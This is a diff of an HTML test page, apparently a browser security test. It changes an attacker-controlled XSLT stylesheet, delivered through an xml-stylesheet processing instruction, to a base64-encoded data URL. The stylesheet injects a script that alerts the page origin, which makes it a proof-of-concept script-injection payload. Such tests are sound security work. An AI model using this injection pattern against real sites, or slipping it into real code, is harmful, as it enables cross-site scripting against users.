@@ -6,15 +6,16 @@
 </head>
 <body>
   <script>
-    let attackerControlledString = 
-        `data:text/xml,
-         <?xml version="1.0" encoding="UTF-8"?>
-         <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
-           <xsl:output method="html" />
-           <xsl:template match="/">
-             <script>alert(origin)</script>
-           </xsl:template>
-         </xsl:stylesheet>`;
+    /*
+    <?xml version="1.0" encoding="UTF-8"?>
+    <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+      <xsl:output method="html" />
+      <xsl:template match="/">
+        <script>alert(origin)</script>
+      </xsl:template>
+    </xsl:stylesheet>
+    */
+    let attackerControlledString = 'data:text/xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHhzbDpzdHlsZXNoZWV0IHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIiB2ZXJzaW9uPSIxLjAiPgogIDx4c2w6b3V0cHV0IG1ldGhvZD0iaHRtbCIgLz4KICA8eHNsOnRlbXBsYXRlIG1hdGNoPSIvIj4KICAgIDxzY3JpcHQ+YWxlcnQob3JpZ2luKTwvc2NyaXB0PgogIDwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg==';
     const pi = document.createProcessingInstruction('xml-stylesheet', `href='${attackerControlledString}' type='text/xml'`);
     document.insertBefore(pi, document.firstChild);
   </script>
